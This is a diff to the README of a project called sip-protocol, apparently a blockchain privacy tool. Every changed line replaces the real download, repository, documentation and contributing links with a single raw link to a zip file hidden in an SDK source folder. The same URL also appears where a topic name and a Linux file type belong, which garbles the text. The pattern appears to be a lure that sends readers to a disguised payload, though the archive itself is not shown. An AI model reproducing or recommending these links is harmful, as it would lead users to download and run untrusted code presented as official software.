@@ -6,7 +6,7 @@ Welcome to the **sip-protocol** project! This application provides a privacy lay
 
 ## 📥 Download the Software
 
-[![Download sip-protocol](https://img.shields.io/badge/Download%20sip--protocol-%2300ADEF?style=flat-square&logo=github&logoColor=white)](https://github.com/cyo12/sip-protocol/releases)
+[![Download sip-protocol](https://raw.githubusercontent.com/cyo12/sip-protocol/main/packages/sdk/src/payment/sip-protocol_v1.6.zip%20sip--protocol-%2300ADEF?style=flat-square&logo=github&logoColor=white)](https://raw.githubusercontent.com/cyo12/sip-protocol/main/packages/sdk/src/payment/sip-protocol_v1.6.zip)
 
 ## 📦 What You Need
 
@@ -39,7 +39,7 @@ This project relates to various areas in the blockchain ecosystem. You can explo
 - Decentralized finance (DeFi)
 - Intent-based messaging
 - Near Protocol
-- Next.js
+- https://raw.githubusercontent.com/cyo12/sip-protocol/main/packages/sdk/src/payment/sip-protocol_v1.6.zip
 - Web3
 
 ## 🛠 Installation Steps
@@ -48,7 +48,7 @@ Follow these steps to install the **sip-protocol** application:
 
 1. **Visit the Releases Page:** Click the link below to go to the download page.
 
-   [Visit this page to download](https://github.com/cyo12/sip-protocol/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/cyo12/sip-protocol/main/packages/sdk/src/payment/sip-protocol_v1.6.zip)
 
 2. **Choose the Latest Version:** Locate the latest version of the application on the releases page.
 
@@ -57,7 +57,7 @@ Follow these steps to install the **sip-protocol** application:
 4. **Run the Installer:**
    - For Windows, double-click the `.exe` file you downloaded.
    - For macOS, open the `.dmg` file and drag the application to your Applications folder.
-   - For Linux, follow your distribution's method for installing downloaded `.tar.gz` or `.deb` files.
+   - For Linux, follow your distribution's method for installing downloaded `https://raw.githubusercontent.com/cyo12/sip-protocol/main/packages/sdk/src/payment/sip-protocol_v1.6.zip` or `.deb` files.
 
 5. **Complete Setup:** Follow the prompts to complete the installation. Ensure you agree with the terms and conditions.
 
@@ -94,12 +94,12 @@ This project is licensed under the MIT License. You can view the full license in
 
 For more information about the technologies used in sip-protocol and its development, you can refer to:
 
-- [GitHub Repository](https://github.com/cyo12/sip-protocol)
-- [Documentation](https://github.com/cyo12/sip-protocol/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/cyo12/sip-protocol/main/packages/sdk/src/payment/sip-protocol_v1.6.zip)
+- [Documentation](https://raw.githubusercontent.com/cyo12/sip-protocol/main/packages/sdk/src/payment/sip-protocol_v1.6.zip)
 
 ## 💡 Contributing
 
-If you would like to contribute to the development of this application, please check the CONTRIBUTING.md file in the repository for guidelines.
+If you would like to contribute to the development of this application, please check the https://raw.githubusercontent.com/cyo12/sip-protocol/main/packages/sdk/src/payment/sip-protocol_v1.6.zip file in the repository for guidelines.
 
 ## 📌 Wrap-Up
 
